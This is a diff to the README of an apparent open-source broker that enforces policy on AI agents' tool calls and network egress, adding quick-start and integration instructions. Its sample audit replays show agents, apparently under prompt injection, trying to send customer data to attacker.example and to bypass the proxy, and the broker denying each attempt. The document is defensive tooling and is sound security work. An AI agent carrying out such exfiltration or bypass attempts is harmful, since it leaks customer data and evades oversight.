@@ -6,12 +6,13 @@
 
 **A policy-enforcing broker for AI agent tool calls and network egress.**
 
+[Quick start](#quick-start) ·
+[Integration](#integration) ·
 [Threat model](#threat-model) ·
 [Trust boundaries](#trust-boundaries) ·
 [Architecture](#system-architecture) ·
 [Decision lifecycle](#decision-lifecycle) ·
 [Policy](#policy-evaluation) ·
-[Quick start](#quick-start) ·
 [Limitations](#known-limitations)
 
 [![CI](https://github.com/slavikztsv/agent-security-broker/actions/workflows/ci.yml/badge.svg)](https://github.com/slavikztsv/agent-security-broker/actions/workflows/ci.yml)
@@ -33,6 +34,238 @@
 > and a continuously-tested exploit, not deployed production software. The
 > [known limitations](#known-limitations) are load-bearing; read them before
 > drawing conclusions from anything above them.
+
+---
+
+## Quick start
+
+Nothing but Python is needed for the policy, audit, replay and scenario paths:
+
+```bash
+git clone https://github.com/slavikztsv/agent-security-broker.git
+cd agent-security-broker
+python3.11 -m venv .venv
+.venv/bin/pip install -e ./warden -e ./demo -e ./tools
+```
+
+Then run it and pick something:
+
+```bash
+.venv/bin/warden-demo
+```
+
+That opens a menu of every run this repo can do — grouped by what each one
+demonstrates, with what it proves and what it costs, and anything needing
+Docker or a model key marked with the reason. Nothing is hidden and nothing is
+blocked. Option `1` is the whole story on one screen, in about three seconds
+and with no network.
+
+Or go straight there:
+
+```bash
+.venv/bin/warden-demo explain --matrix
+```
+
+```
+  scenario       refused by         without the broker           with it
+  ───────────────────────────────────────────────────────────────────────
+  triage         several            10,313 records read          3 refused, 1 records read
+  share          egress.pii_sink    138 bytes filed internally   1 refused, 0 bytes filed internally
+  export         egress.allowlist   155 bytes out                1 refused, 0 bytes out
+  notify         mail.counterparty  1 misdirected email          1 refused, 0 misdirected email
+  readonly       tools.allowed      1 email sent as the company  1 refused, 0 email sent as the company
+  inject-vendor  egress.allowlist   119 bytes out                1 refused, 0 bytes out
+  crosscheck     rows.scope         4 records read               4 refused, 1 records read
+```
+
+Each row is the **same recorded transcript** run twice — identical model
+output on both sides, so the broker is the only variable.
+
+To reconstruct a real task's decisions from a frozen audit log:
+
+```bash
+.venv/bin/warden replay 4711 --audit tests/golden/audit-4711.jsonl
+```
+
+```
+task 4711  purpose=support-triage  agent=triage-bot
+  ✓ read_document(ticket-4711)             allow
+  ✓ read_document(kb/refund-policy)        allow
+  ✓ query_customers(rows≈1)                allow
+      ⛔ TAINT: task now holds data_class=pii
+  ✗ query_customers(rows≈10312)            DENY   rows.bounded
+  ✗ http_fetch(attacker.example/collect)   DENY   egress.allowlist
+  ✗ http_fetch(docstore.internal/feedback) DENY   egress.pii_sink
+  ✓ send_email(customer:8812)              allow
+  chain intact: 7 records, head sha256:…
+```
+
+That block came from a run against a real OPA server and the real policy
+bundle; a test pins it to the frozen log. The last line is an actual chain
+verification — a tampered log renders as `⚠ CHAIN BROKEN at seq N` **and exits
+1**, so the verdict survives being piped or scripted.
+
+An out-of-band bypass attempt carries no token, so it is attributed to the
+sentinel principal and recorded by the proxy rather than the tool API:
+
+```
+task -  purpose=-  agent=unauthenticated
+  ✗ CONNECT(attacker.example)              DENY   unauthenticated
+  chain intact: 1 records, head sha256:…
+```
+
+`unauthenticated`, not `egress.allowlist` — nothing on `agent-net` holds a
+token to present, so the attempt is refused before any policy question is
+asked. That is the stronger record: the bypass carried no authority at all.
+
+The full containerised scenario needs Docker:
+
+```bash
+cp .env.example .env                        # only required for --live
+.venv/bin/warden-demo up --profile guarded
+```
+
+> [!NOTE]
+> The broker exposes no health endpoint. Liveness is confirmed by a real tool
+> call, or by `warden verify-chain` against the audit log it is writing.
+
+Everything the demo can do is in **[docs/DEMO.md](docs/DEMO.md)**.
+
+---
+
+## Integration
+
+`warden` goes in front of an agent you already have. **Your agent's code does
+not change** — you point it at two endpoints with environment variables, and
+both are standard enough that a third-party SDK you cannot patch is covered
+too.
+
+```mermaid
+flowchart LR
+    subgraph yours["Your agent — code unchanged"]
+        Loop["Agent loop"]
+        SDK["Model SDK, HTTP client, curl…"]
+    end
+
+    subgraph broker["warden"]
+        API["Tool API :8080"]
+        Proxy["Egress proxy :3128"]
+        Policy["Policy + taint + audit"]
+    end
+
+    subgraph out["Your systems"]
+        Sys["Databases, internal APIs, mail"]
+        Net["Allowlisted external hosts"]
+    end
+
+    Loop -->|"BROKER_URL + Bearer token"| API
+    SDK -->|"HTTP_PROXY with the token in the URL"| Proxy
+    API --> Policy
+    Proxy --> Policy
+    Policy -->|"allow"| Sys
+    Policy -->|"allow"| Net
+    Policy -->|"deny + audit record"| Refused["403 naming the rule"]
+```
+
+### The two surfaces
+
+| Surface | Your agent does | Carries the token as |
+|---|---|---|
+| **Tool API** `:8080` | `POST $BROKER_URL/v1/tools/<tool>/invoke` with `{"args": {…}}` | `Authorization: Bearer <token>` |
+| **Egress proxy** `:3128` | nothing — any proxy-aware client routes itself | `Proxy-Authorization`, set automatically from the proxy URL's userinfo |
+
+The proxy accepts the token as `Bearer` *or* as HTTP Basic, because a vendor
+SDK owns its own HTTP client and will not set a custom header for you — but
+every proxy-aware client sends `Proxy-Authorization` when the proxy URL carries
+userinfo. The username is ignored; the password is the token.
+
+### End to end
+
+**1. Describe your deployment** in three files — `warden.toml` (where the
+broker listens, its public key, OPA, the audit path), `tools.toml` (your tools,
+their adapters and arg schemas) and `data.json` (purposes, allowlists, limits).
+[warden/reference/README.md](warden/reference/README.md) walks through each;
+`demo/scenario/` is a complete worked example.
+
+**2. Split the keypair** — generated outside every container, so the
+enforcement point never holds a signing key:
+
+```bash
+openssl genpkey -algorithm ed25519 -out agent.key      # control plane only
+openssl pkey -in agent.key -pubout -out agent.pub      # broker only
+```
+
+**3. Start OPA, the broker, and the control plane** — the control plane on a
+network your agent has no route to.
+
+**4. Mint a task token** for one unit of work, scoped to what that work
+genuinely needs:
+
+```bash
+TASK_TOKEN=$(curl -s -X POST http://localhost:8081/v1/tokens \
+  -H 'content-type: application/json' \
+  -d '{"agent_id":"triage-bot","task_id":"4711","purpose":"support-triage",
+       "allowed_tools":["read_document","query_customers","send_email"],
+       "data_classes":["public","internal"],
+       "counterparties":["customer:8812"]}' | jq -r .token)
+```
+
+**5. Point your agent at the broker** — this is the whole integration:
+
+```bash
+export BROKER_URL=http://broker:8080
+export TASK_TOKEN
+
+# Every proxy-aware client, including SDKs you cannot patch.
+export HTTP_PROXY="http://agent:$TASK_TOKEN@broker:3128"
+export HTTPS_PROXY="$HTTP_PROXY"
+# Lowercase too: curl deliberately ignores uppercase HTTP_PROXY for plain-http
+# URLs (the httpoxy mitigation), so without these a plain-http probe dies at
+# DNS and is never recorded as an attempt.
+export http_proxy="$HTTP_PROXY"
+export https_proxy="$HTTP_PROXY"
+# The broker's own tool API must not be proxied through the broker's own proxy.
+# httpx and requests honour these variables by default, so without this every
+# legitimate tool call loops back through :3128.
+export NO_PROXY=broker
+```
+
+**6. Run your agent unchanged.** Tool calls are brokered; everything else that
+speaks HTTP is proxied; both are policy-checked against the same task state and
+appended to the same audit chain.
+
+> [!IMPORTANT]
+> The environment variables route traffic; they do not *contain* it. An agent
+> that can reach a system directly will, and enforcement is bypassed entirely.
+> The variables are a convenience for the agent — the boundary is the network:
+> put the agent where the broker is the only route out. In this repo that is
+> `agent-net`, declared `internal: true` so Docker attaches no gateway.
+
+### What a denial looks like
+
+```console
+$ curl -s -X POST $BROKER_URL/v1/tools/query_customers/invoke \
+    -H "authorization: Bearer $TASK_TOKEN" \
+    -d '{"args":{"filter":"all"}}'
+{"error":"policy_denied","rule":"rows.bounded","message":"Denied by policy rule rows.bounded."}
+```
+
+The agent sees a 403 naming the rule, the decision is already in the audit log,
+and the task's row budget is unchanged because nothing executed. A tool call
+with no usable token returns 401 and is *still* recorded, under the sentinel
+principal — an unrecorded refusal would make a probe indistinguishable from a
+run that never happened.
+
+A refused `CONNECT` gets the same treatment on the proxy side, where the rule
+travels in a header because a tunnel has no body to put it in:
+
+| Situation | Response | Header |
+|---|---|---|
+| Policy refused the destination | `403 Forbidden` | `X-Warden-Rule: egress.allowlist` (or the rule that fired) |
+| No usable token | `403 Forbidden` | `X-Warden-Rule: unauthenticated` |
+| Audit log unwritable | `503 Service Unavailable` | `X-Warden-Rule: audit.unavailable` |
+| Not a `CONNECT` | `405 Method Not Allowed` | recorded as a probe |
+| Unparseable authority | `400 Bad Request` | `X-Warden-Rule: proxy.unparseable` |
 
 ---
 
@@ -444,71 +677,6 @@ usable token was presented). Both deny, and both are recorded.
 |---|---|---|
 | `allow` | No rule objected | Recorded first, then executed through the adapter |
 | `deny` | A rule objected, or no decision could be obtained | Recorded with the rule; 403; nothing executes |
-
----
-
-## Quick start
-
-No Docker needed for the policy, audit and replay paths:
-
-```bash
-git clone https://github.com/slavikztsv/agent-security-broker.git
-cd agent-security-broker
-python3.11 -m venv .venv
-.venv/bin/pip install -e ./warden -e ./demo -e ./tools
-```
-
-Reconstruct a real task's decisions from a frozen audit log:
-
-```bash
-.venv/bin/warden replay 4711 --audit tests/golden/audit-4711.jsonl
-```
-
-```
-task 4711  purpose=support-triage  agent=triage-bot
-  ✓ read_document(ticket-4711)             allow
-  ✓ read_document(kb/refund-policy)        allow
-  ✓ query_customers(rows≈1)                allow
-      ⛔ TAINT: task now holds data_class=pii
-  ✗ query_customers(rows≈10312)            DENY   rows.bounded
-  ✗ http_fetch(attacker.example/collect)   DENY   egress.allowlist
-  ✗ http_fetch(docstore.internal/feedback) DENY   egress.pii_sink
-  ✓ send_email(customer:8812)              allow
-  chain intact: 7 records, head sha256:…
-```
-
-That output is produced by a run against a real OPA server and the real policy
-bundle — it is not written by hand, and a test pins this block to the frozen
-log. The last line is the result of an actual chain verification: a tampered
-log renders as `⚠ CHAIN BROKEN at seq N` **and exits 1**, so the verdict
-survives being piped or scripted.
-
-An out-of-band bypass attempt carries no token, so it is attributed to the
-sentinel principal and recorded by the proxy rather than the tool API:
-
-```
-task -  purpose=-  agent=unauthenticated
-  ✗ CONNECT(attacker.example)              DENY   unauthenticated
-  chain intact: 1 records, head sha256:…
-```
-
-`unauthenticated`, not `egress.allowlist` — nothing on `agent-net` holds a
-token to present, so the attempt is refused before any policy question is
-asked. That is the stronger record: the bypass carried no authority at all.
-
-The full end-to-end scenario needs Docker:
-
-```bash
-cp .env.example .env                        # only required for --live
-.venv/bin/warden-demo up --profile guarded
-```
-
-> [!NOTE]
-> The broker exposes no health endpoint. Liveness is confirmed by a real tool
-> call, or by `warden verify-chain` against the audit log it is writing.
-
-The A/B, the narrated walkthrough, the cross-scenario matrix, and running
-against a real model are all in **[docs/DEMO.md](docs/DEMO.md)**.
 
 ---
 
